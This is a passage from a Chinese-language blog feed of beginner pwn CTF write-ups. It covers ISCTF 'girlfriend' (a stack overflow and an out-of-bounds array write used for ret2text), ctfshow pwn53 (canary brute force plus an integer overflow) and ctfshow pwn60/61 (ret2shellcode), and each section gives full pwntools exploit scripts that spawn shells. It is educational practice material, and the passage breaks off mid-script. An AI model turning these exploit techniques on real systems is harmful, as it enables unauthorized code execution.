id&quot;);</span><br><span class="line">  read(0, buf, 0x30uLL);</span><br><span class="line">  if ( strcmp(s1, &quot;admin&quot;) )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;no no no&quot;);</span><br><span class="line">    exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  puts(&quot;ok, go on&quot;);</span><br><span class="line">  vuln();</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__int64 vuln()</span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; // rax</span><br><span class="line">  _QWORD v1[5]; // [rsp+0h] [rbp-30h] BYREF</span><br><span class="line">  __int64 i; // [rsp+28h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  for ( i = 0LL; i &lt;= 7; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;please input your %d girlfriend birthday\n&quot;, i + 1);</span><br><span class="line">    result = __isoc99_scanf(&quot;%ld&quot;, &amp;v1[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>canary保护关<br>NX保护开<br>PIE关  </p><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-25_23-05-44.51el69r656.webp"></p><p>存在system和bin&#x2F;sh字符串，而且可以直接getshell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">void __fastcall amaze()</span><br><span class="line">&#123;</span><br><span class="line">  system(&quot;/bin/sh&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结合本题是除签到以外的第一道pwn题，因此把方向定到了ret2text和栈溢出</p><h1 id="利用栈溢出实现任意写"><a href="#利用栈溢出实现任意写" class="headerlink" title="利用栈溢出实现任意写"></a>利用栈溢出实现任意写</h1><p>下面来具体分析程序</p><p>第一关考察了利用栈溢出实现任意写，以下是第一段payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = 0x28 * b&#x27;\x00&#x27;</span><br><span class="line">payload += b&#x27;admin\x00\x00\x00&#x27;</span><br><span class="line">p.sendafter(b&#x27;team id&#x27;, payload)</span><br></pre></td></tr></table></figure><p>我们必须要通过strcmp函数关于s1和admin字符串的比较才能进入vuln函数，但是我们无法通过直接写的方式把admin字符串写到s1里，那我们就要利用栈溢出，先通过read覆盖buf，40个，即0x28个字节，然后会溢出到s1，通过栈溢出实现任意写</p><p>需要注意的是admin后面跟了三个\x00，因为strcmp(a, b)是逐字节比较a和b，直到遇到第一个\x00才停止，\x00也是字符串结束的标志。admin为5个字节，因此我们最好补充三个\x00凑够8个字节，当然一个\x00有时候也可以</p><h1 id="数组越界"><a href="#数组越界" class="headerlink" title="数组越界"></a>数组越界</h1><p>进vuln函数开始第二关，我们需要关注的是定义了一个大小为5字节的数组v1，以及定义了局部变量i</p><p>然后有一个循环，scanf让我们可以读进long类型的整数,这里需要注意，我们通过这种方式输入的必须是十进制整数，因此我们需要把后门函数的十六进制地址手动转化成十进制的。并且这里用p64打包也是不可以的</p><p>v1[i]需要引起我们的注意，这里就涉及到了数组越界的知识</p><p>关于数组越界，可以参考下面的文章</p><blockquote><p><a href="https://hello-ctf.com/hc-pwn/Stack_Overflow/">https://hello-ctf.com/hc-pwn/Stack_Overflow/</a></p></blockquote><p>总之，程序给v1的内存大小只有五个字节，当我们将其改为v1[6]时，我们就可以往栈上写东西了</p><p>我们的思路是，先一次输入5个数，比如1，1，1，1，1，第六次时输入6，为什么要输入6，是因为此时的栈大概是这样的</p><p>[高地址]<br>RIP<br>RBP<br>i<br>v[4]<br>v[3]<br>v[2]<br>v[1]<br>v[0]<br>[低地址]  </p><p>我们输入6后，将会把i覆盖成6，这个时候就能出现a[6]，同时循环也不会结束，（如果我们写入1，循环不会继续进行），由于i小于7，i会继续加1，这就有第七次写入的机会</p><p>我们必须要知道，这个循环不会因为我们的输入而停止，只要i小于等于7，循环一定是会进行的，并且一定会进行8次</p><p>我们可以通过gdb调试一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">elf = ELF(&quot;./pwn&quot;)</span><br><span class="line">context(arch=elf.arch, os=elf.os)</span><br><span class="line">context.terminal = [&#x27;tmux&#x27;, &#x27;split-window&#x27;, &#x27;-h&#x27;]</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">p = process([elf.path])</span><br><span class="line">#p = remote(&#x27;challenge.imxbt.cn&#x27; , 32106)</span><br><span class="line"></span><br><span class="line">gdb.attach(p, &#x27;b vuln&#x27;)</span><br><span class="line"></span><br><span class="line">payload = 0x28 * b&#x27;A&#x27;</span><br><span class="line">payload += b&#x27;admin\x00\x00\x00&#x27;</span><br><span class="line">#gdb.attach(p , &#x27;b vuln&#x27;)</span><br><span class="line">p.sendafter(b&#x27;team id&#x27;, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-25_21-41-12.1hsngi3csz.webp"></p><p>通过gdb调试，我注意到一个很有意思的事，我明明没有覆盖到rbp，但是rbp指针指向的地址里却有个1</p><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-26_00-10-19.102lrxyovk.webp"></p><p>这是没有开始覆盖前的栈，可以看到确rbp天然存了一个1，这就让我们不需要再覆盖rbp了，因此直接加上后门函数的地址即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#p=process(&quot;./girlfriend&quot;)</span><br><span class="line">p=remote(&quot;challenge.imxbt.cn&quot;,32331)</span><br><span class="line">payload=b&#x27;a&#x27;*0x28+b&#x27;admin\x00\x00\x00&#x27;</span><br><span class="line">p.send(payload)</span><br><span class="line">p.sendline(&#x27;1&#x27;)</span><br><span class="line">p.sendline(&#x27;1&#x27;)</span><br><span class="line">p.sendline(&#x27;1&#x27;)</span><br><span class="line">p.sendline(&#x27;1&#x27;)</span><br><span class="line">p.sendline(&#x27;1&#x27;)</span><br><span class="line">p.sendline(&#x27;6&#x27;)</span><br><span class="line">#理论上是需要再sendline一个padding覆盖rbp的</span><br><span class="line">p.sendline(str(0x40121E))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/4514374EFE2509819639A5A5FEA42C78.1sfh9okrzs.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;开始做ISCTF的真题&lt;/p&gt;
&lt;h1 id=&quot;girlfriend&quot;&gt;&lt;a href=&quot;#girlfriend&quot; class=&quot;headerlink&quot; title=&quot;girlfriend&quot;&gt;&lt;/a&gt;girlfriend&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;题目难度：简</summary>
      
    
    
    
    <category term="pwn入门" scheme="https://jiutian521.github.io/categories/pwn%E5%85%A5%E9%97%A8/"/>
    
    
    <category term="ret2text" scheme="https://jiutian521.github.io/tags/ret2text/"/>
    
    <category term="数组越界" scheme="https://jiutian521.github.io/tags/%E6%95%B0%E7%BB%84%E8%B6%8A%E7%95%8C/"/>
    
    <category term="gdb" scheme="https://jiutian521.github.io/tags/gdb/"/>
    
  </entry>
  
  <entry>
    <title>canary爆破与简单的整数溢出</title>
    <link href="https://jiutian521.github.io/posts/77bff720.html"/>
    <id>https://jiutian521.github.io/posts/77bff720.html</id>
    <published>2025-11-22T16:00:00.000Z</published>
    <updated>2025-11-23T07:36:09.933Z</updated>
    
    <content type="html"><![CDATA[<p>由于这道题的非常非常重要，我必须单独开一个blog讲解一下</p><h1 id="canary保护"><a href="#canary保护" class="headerlink" title="canary保护"></a>canary保护</h1><p>一个开了canary保护的栈如下</p><p>[高地址]<br>参数<br>EIP（返回地址）<br>EBP<br><strong>canary</strong><br>局部变量（缓冲区buf）<br>[低地址]</p><p>为了防止我们覆盖EIP，程序在缓冲区和返回地址之间插了一个随机生成的数值，即canary，如果canary的值和原本不符（比如被我们覆盖成了AAAAAAAA），程序会调用 __stack_chk_fail 函数，终止进程</p><p>我们可以把canary理解为cookie</p><p>因此，我们必须要在canary的位置覆盖上正确的值，才能覆盖到返回地址，目前有两种办法，泄露和爆破，先讲一下后者</p><h1 id="爆破canary"><a href="#爆破canary" class="headerlink" title="爆破canary"></a>爆破canary</h1><h2 id="爆破的前提条件"><a href="#爆破的前提条件" class="headerlink" title="爆破的前提条件"></a>爆破的前提条件</h2><p>并不是所有的 Canary 都能爆破，通常需要满足以下两个条件之一：</p><p>Fork 机制（BROP 中常见）：服务器使用 fork() 创建子进程来处理请求。子进程的内存布局（包括 Canary）是父进程的副本，因此每次连接时的 Canary 都是一样的</p><p>静态 Canary：Canary 的值是固定的（例如从固定文件中读取，且文件内容不变），或者随机数种子被固定了。只要我们重新连接，Canary 的值还是那个</p><p>如果每次程序运行 Canary 都是完全随机且不同的，这种爆破方法就会失效</p><h2 id="逐字节爆破canary"><a href="#逐字节爆破canary" class="headerlink" title="逐字节爆破canary"></a>逐字节爆破canary</h2><p>如果我们每一次都是尝试不同的地址，那需要尝试256的4次方次，显然不可能，于是我们可以选择逐位爆破，从第1位开始尝试，不动其他3位，这样如果程序不崩溃，那么第1位的值就确定了，以此类推</p><p>一个字节的大小是256，也就是说，我们最多需要尝试256*4&#x3D;1024次即可爆破成功</p><p>在我突击了几天python后，终于可以理解这段爆破的方法了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># 1. 外层循环：决定我们要猜第几个字节（一共4个）</span><br><span class="line">for i in range(4):</span><br><span class="line">    # 2. 内层循环：尝试所有可能的数值（0x00 - 0xFF）</span><br><span class="line">    for c in range(256):</span><br><span class="line">        io = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28197) # 每次都要重连</span><br><span class="line">        io.sendlineafter(b&#x27;&gt;&#x27;, b&#x27;-1&#x27;)                # 触发整数溢出漏洞</span><br><span class="line">        </span><br><span class="line">        # 3. 构造试探性 Payload</span><br><span class="line">        payload = b&#x27;a&#x27; * 32 + canary + p8(c)</span><br><span class="line">        io.sendafter(b&#x27;$ &#x27;, payload)</span><br><span class="line">        </span><br><span class="line">        # 4. 接收反馈并判断</span><br><span class="line">        res = io.recvall(timeout=1)</span><br><span class="line">        if b&#x27;Canary Value Incorrect&#x27; not in res:</span><br><span class="line">            canary += p8(c)   # 猜对了！记录下来</span><br><span class="line">            print(f&quot;[*] Found byte: &#123;hex(c)&#125;&quot;)</span><br><span class="line">            io.close()</span><br><span class="line">            break</span><br><span class="line">        io.close()</span><br></pre></td></tr></table></figure><h1 id="eg-ctfshow-pwn53"><a href="#eg-ctfshow-pwn53" class="headerlink" title="eg:ctfshow pwn53"></a>eg:ctfshow pwn53</h1><blockquote><p>再多一眼看一眼就会爆炸</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(stdout, 0, 2, 0);</span><br><span class="line">  logo();</span><br><span class="line">  canary();</span><br><span class="line">  ctfshow();</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">int canary()</span><br><span class="line">&#123;</span><br><span class="line">  FILE *stream; // [esp+Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  stream = fopen(&quot;/canary.txt&quot;, &quot;r&quot;);</span><br><span class="line">  if ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;/canary.txt: No such file or directory.&quot;);</span><br><span class="line">    exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  fread(&amp;global_canary, 1u, 4u, stream);</span><br><span class="line">  return fclose(stream);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">int ctfshow()</span><br><span class="line">&#123;</span><br><span class="line">  size_t nbytes; // [esp+4h] [ebp-54h] BYREF</span><br><span class="line">  char v2[32]; // [esp+8h] [ebp-50h] BYREF</span><br><span class="line">  char buf[32]; // [esp+28h] [ebp-30h] BYREF</span><br><span class="line">  int s1; // [esp+48h] [ebp-10h] BYREF</span><br><span class="line">  int v5; // [esp+4Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v5 = 0;</span><br><span class="line">  s1 = global_canary;</span><br><span class="line">  printf(&quot;How many bytes do you want to write to the buffer?\n&gt;&quot;);</span><br><span class="line">  while ( v5 &lt;= 31 )</span><br><span class="line">  &#123;</span><br><span class="line">    read(0, &amp;v2[v5], 1u);</span><br><span class="line">    if ( v2[v5] == 10 )</span><br><span class="line">      break;</span><br><span class="line">    ++v5;</span><br><span class="line">  &#125;</span><br><span class="line">  __isoc99_sscanf(v2, &quot;%d&quot;, &amp;nbytes);</span><br><span class="line">  printf(&quot;$ &quot;);</span><br><span class="line">  read(0, buf, nbytes);</span><br><span class="line">  if ( memcmp(&amp;s1, &amp;global_canary, 4u) )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Error *** Stack Smashing Detected *** : Canary Value Incorrect!&quot;);</span><br><span class="line">    exit(-1);</span><br><span class="line">  &#125;</span><br><span class="line">  puts(&quot;Where is the flag?&quot;);</span><br><span class="line">  return fflush(stdout);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个题实际上是没有开启真正的canary保护的，只是在远程部署了一个类canary的文件，然后用memcmp函数去比较，如果不符合&amp;global_canary里的值就会报错并退出，所以属于是静态canary，值是固定的，因此可以爆破</p><p>并且已经给了我们flag后门函数，只要把返回地址覆盖到flag就可以了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">int flag()</span><br><span class="line">&#123;</span><br><span class="line">  char s[64]; // [esp+Ch] [ebp-4Ch] BYREF</span><br><span class="line">  FILE *stream; // [esp+4Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  stream = fopen(&quot;/ctfshow_flag&quot;, &quot;r&quot;);</span><br><span class="line">  if ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;/ctfshow_flag: No such file or directory.&quot;);</span><br><span class="line">    exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, 64, stream);</span><br><span class="line">  puts(s);</span><br><span class="line">  return fflush(stdout);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是这时我们又迎来了一个新的问题</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__isoc99_sscanf(v2, &quot;%d&quot;, &amp;nbytes);</span><br><span class="line">printf(&quot;$ &quot;);</span><br><span class="line">read(0, buf, nbytes);</span><br></pre></td></tr></table></figure><blockquote><p>int sscanf(const char *str, const char *format, …);</p></blockquote><p>功能：从一个字符串中读取与指定格式相符的数据，并将其存储到后续参数指定的变量地址中，即即 &amp;nbytes</p><p>而read函数读入的字节长度就是我们传入的nbytes大小，这导致我们输入的长度是被限制的，这时候就需要我们的整数溢出了</p><h1 id="整数溢出"><a href="#整数溢出" class="headerlink" title="整数溢出"></a>整数溢出</h1><p>这里和CSAPP第二章整数表示和补码的部分高度相关</p><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-23_15-01-50.175tjz3mq9.webp"></p><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-23_15-01-38.1apfhowpg7.webp"></p><p>程序问我们How many bytes do you want to write to the buffer?</p><p>假如我们用sscanf输入了-1，会发生什么呢</p><p>在内存中，-1 的样子是： 1111 1111 1111 1111 1111 1111 1111 1111 （十六进制为0xFFFFFFFF）</p><p>%d指有符号整数，它看到最高位为1时，就知道是负数，具体为什么看CSAPP即可</p><p>但是由于我们定义了size_t nbytes，也就是说nbytes是一个无符号数，那么read看到的就是4,294,967,295这个数，即我们可以读入这么长的数</p><p>也就是我们先用sscanf读进去-1，再用read函数去爆破canary就可以了</p><h1 id="canary爆破模板和最终exp"><a href="#canary爆破模板和最终exp" class="headerlink" title="canary爆破模板和最终exp"></a>canary爆破模板和最终exp</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(arch=&#x27;i386&#x27;, log_level=&#x27;error&#x27;) </span><br><span class="line">binary = &#x27;./pwn&#x27;</span><br><span class="line">canary = b&#x27;&#x27;</span><br><span class="line">#设置初始的canary为空</span><br><span class="line"></span><br><span class="line">print(f&quot;[+] 开始爆破 Canary...&quot;)</span><br><span class="line"></span><br><span class="line"># 第一步：双层循环爆破 4 字节 Canary</span><br><span class="line">for i in range(4):</span><br><span class="line">    for c in range(256):</span><br><span class="line">        # 每次尝试都必须重新连接</span><br><span class="line">        io = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28197)</span><br><span class="line">        io.sendlineafter(b&#x27;&gt;&#x27;, b&#x27;-1&#x27;)  </span><br><span class="line">        </span><br><span class="line">        # 尝试发送：Padding + 已知Canary + 当前猜测字节</span><br><span class="line">        io.sendafter(b&#x27;$ &#x27;, b&#x27;a&#x27; * 32 + canary + p8(c))</span><br><span class="line">        </span><br><span class="line">        # 判断：如果没有收到报错信息，说明猜对了</span><br><span class="line">        res = io.recvall(timeout=1)</span><br><span class="line">        if b&#x27;Canary Value Incorrect&#x27; not in res:</span><br><span class="line">            canary += p8(c)</span><br><span class="line">            print(f&quot;[*] Found byte &#123;i+1&#125;: &#123;hex(c)&#125; -&gt; Current: &#123;canary.hex()&#125;&quot;)</span><br><span class="line">            io.close()</span><br><span class="line">            break # 跳出内层循环，猜下一个字节</span><br><span class="line">        io.close()</span><br><span class="line"></span><br><span class="line"># 第二步：拿到完整 Canary，发送最终 Payload</span><br><span class="line">print(f&quot;[+] Final Canary: &#123;canary.hex()&#125;&quot;)</span><br><span class="line">io = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28197)</span><br><span class="line">io.sendlineafter(b&#x27;&gt;&#x27;, b&#x27;-1&#x27;)</span><br><span class="line"></span><br><span class="line">payload = flat(b&#x27;a&#x27; * 32, canary, p32(0) * 4, ELF(binary).sym[&#x27;flag&#x27;])</span><br><span class="line">io.sendafter(b&#x27;$ &#x27;, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-23_15-25-11.2yysewgpa7.webp"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;由于这道题的非常非常重要，我必须单独开一个blog讲解一下&lt;/p&gt;
&lt;h1 id=&quot;canary保护&quot;&gt;&lt;a href=&quot;#canary保护&quot; class=&quot;headerlink&quot; title=&quot;canary保护&quot;&gt;&lt;/a&gt;canary保护&lt;/h1&gt;&lt;p&gt;一个开了canar</summary>
      
    
    
    
    <category term="pwn入门" scheme="https://jiutian521.github.io/categories/pwn%E5%85%A5%E9%97%A8/"/>
    
    
    <category term="canary" scheme="https://jiutian521.github.io/tags/canary/"/>
    
    <category term="整数溢出" scheme="https://jiutian521.github.io/tags/%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/"/>
    
  </entry>
  
  <entry>
    <title>ret2shellcode刷题</title>
    <link href="https://jiutian521.github.io/posts/cfe136a4.html"/>
    <id>https://jiutian521.github.io/posts/cfe136a4.html</id>
    <published>2025-11-21T04:00:00.000Z</published>
    <updated>2025-11-23T10:31:45.926Z</updated>
    
    <content type="html"><![CDATA[<p>首先写在前面：所有题都是没有开NX保护的，我都checksec过了，就不再每一题都贴了</p><h1 id="ctfshow-pwn60"><a href="#ctfshow-pwn60" class="headerlink" title="ctfshow pwn60"></a>ctfshow pwn60</h1><blockquote><p>入门难度shellcode</p></blockquote><blockquote><p>考点：strncpy函数</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char s[100]; // [esp+1Ch] [ebp-64h] BYREF</span><br><span class="line"></span><br><span class="line">  setvbuf(stdout, 0, 2, 0);</span><br><span class="line">  setvbuf(stdin, 0, 1, 0);</span><br><span class="line">  puts(&quot;CTFshow-pwn can u pwn me here!!&quot;);</span><br><span class="line">  gets(s);</span><br><span class="line">  strncpy(buf2, s, 0x64u);</span><br><span class="line">  printf(&quot;See you ~&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>关于strncpy函数的介绍：  <a href="https://www.runoob.com/cprogramming/c-function-strncpy.html">https://www.runoob.com/cprogramming/c-function-strncpy.html</a></p></blockquote><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-21_08-05-17.8l0ipgwf9c.webp"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span><br><span class="line">io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28174)</span><br><span class="line">buf2 = 0x804A080</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">payload = shellcode.ljust(112,b&#x27;a&#x27;) + p32(buf2)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>这里用的很妙的是ljust函数，因为shellcode也是有长度的，如果直接用+拼接，那么会超过偏移量，这里的意思是：不管 shellcode 实际有多长，ljust都能让总长度变成 112 字节。如果 shellcode 不够 112 字节，缺多少就在后面（右边）补多少个 a</p><p>这样做到了一举两得，既填充了padding，又写入了shellcode</p><h1 id="ctfshow-pwn61（shellcode长度超标和recvuntil）"><a href="#ctfshow-pwn61（shellcode长度超标和recvuntil）" class="headerlink" title="ctfshow pwn61（shellcode长度超标和recvuntil）"></a>ctfshow pwn61（shellcode长度超标和recvuntil）</h1><blockquote><p>输出了什么？</p></blockquote><blockquote><p>考点：recvuntil的分步使用，内存分布的理解</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  FILE *v3; // rdi</span><br><span class="line">  __int64 v5[2]; // [rsp+0h] [rbp-10h] BYREF</span><br><span class="line"></span><br><span class="line">  v5[0] = 0LL;</span><br><span class="line">  v5[1] = 0LL;</span><br><span class="line">  v3 = _bss_start;</span><br><span class="line">  setvbuf(_bss_start, 0LL, 1, 0LL);</span><br><span class="line">  logo(v3, 0LL);</span><br><span class="line">  puts(&quot;Welcome to CTFshow!&quot;);</span><br><span class="line">  printf(&quot;What&#x27;s this : [%p] ?\n&quot;, v5);</span><br><span class="line">  puts(&quot;Maybe it&#x27;s useful ! But how to use it?&quot;);</span><br><span class="line">  gets(v5);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个题的PIE保护是开的，因此我们每次输出的v5的地址在栈上都是随机的，我们需要接收这个地址，并且把shellcode写进去，但问题是%p周围有一堆提示，我们应该怎么只挑出%p打印的地址呢，这就需要用到recvuntil了</p><h2 id="recvuntil-的基本用法"><a href="#recvuntil-的基本用法" class="headerlink" title="recvuntil 的基本用法"></a>recvuntil 的基本用法</h2><blockquote><p>tube.recvuntil(delimiters, drop&#x3D;False, timeout&#x3D;default)</p></blockquote><p>其中：</p><p>tube: 是一个连接对象，通常是 pwnlib.tubes.remote (远程连接) 或 pwnlib.tubes.process (本地进程)</p><p>delimiters: 必需。您期望接收数据直到遇到的那个终止字符串（或字节串），<strong>必须是b’string’</strong></p><p>drop: 可选。一个布尔值，默认为 False</p><p>如果设置为 True，则接收到的数据将不包含这个终止字符串 (delimiters)</p><p>如果设置为 False (默认)，则接收到的数据将包含这个终止字符串 (delimiters)</p><p>timeout: 可选。设置等待数据的最大时间（秒）。如果超时，会抛出 pwnlib.timeout 异常</p><p>我们可以通过用两次recvuntil”过滤”掉%p周围的字符，第一次recvuntil是接收[前的字符，第二次是接收]前的字符，我们用的时候就是第二次recvuntil的内容了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">io.recvuntil(&#x27;[&#x27;)</span><br><span class="line">v5_addr = 